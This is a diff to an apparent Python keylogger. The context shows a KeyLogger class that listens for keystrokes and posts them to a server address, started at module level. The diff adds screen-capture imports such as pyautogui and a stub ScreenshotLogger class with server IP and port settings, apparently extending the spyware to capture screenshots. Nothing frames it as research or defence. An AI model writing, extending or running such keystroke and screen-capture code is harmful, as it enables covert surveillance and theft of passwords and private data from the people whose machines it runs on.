@@ -6,6 +6,12 @@ import json
 
 import threading
 
+import pyautogui
+import string
+import random
+from datetime import datetime
+
+
 class KeyLogger:
 
     def __init__(self, interval, port, server_ip):
@@ -55,6 +61,13 @@ class KeyLogger:
         self._send_post_request()
         with keyboard.Listener(on_press=self._on_press) as listener:
             listener.join()
+
+class ScreenshotLogger:
+    def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
+        self.interval = interval
+        self.server_ip = server_ip
+        self.port = port
+
 
 keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
 keylogger.start()
